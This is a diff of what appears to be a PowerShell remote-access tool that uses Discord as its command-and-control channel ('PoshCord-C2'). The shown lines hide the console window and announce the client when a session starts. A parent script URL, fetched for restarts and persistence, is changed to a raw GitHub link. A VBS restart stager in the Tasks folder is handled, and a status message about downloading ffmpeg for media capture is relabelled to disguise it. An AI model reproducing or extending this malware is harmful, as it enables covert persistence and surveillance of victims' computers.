@@ -25,7 +25,7 @@ $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window whil
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $defaultstart = 1 # Option to start all jobs automatically upon running
-$parent = "https://is.gd/bw0dcc2" # parent script URL (for restarts and persistance)
+$parent = "https://raw.githubusercontent.com/Eltechno2/PoshCord-C2/refs/heads/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -41,7 +41,7 @@ $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 # =============================================================== MODULE FUNCTIONS =========================================================================
 # Download ffmpeg.exe function (dependency for media capture) 
 Function GetFfmpeg{
-    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
+    sendMsg -Message ":hourglass: ``Downloading UOS to Client.... Please Wait`` :hourglass:"
     $Path = "$env:Temp\ffmpeg.exe"
     $tempDir = "$env:temp"
     If (!(Test-Path $Path)){  
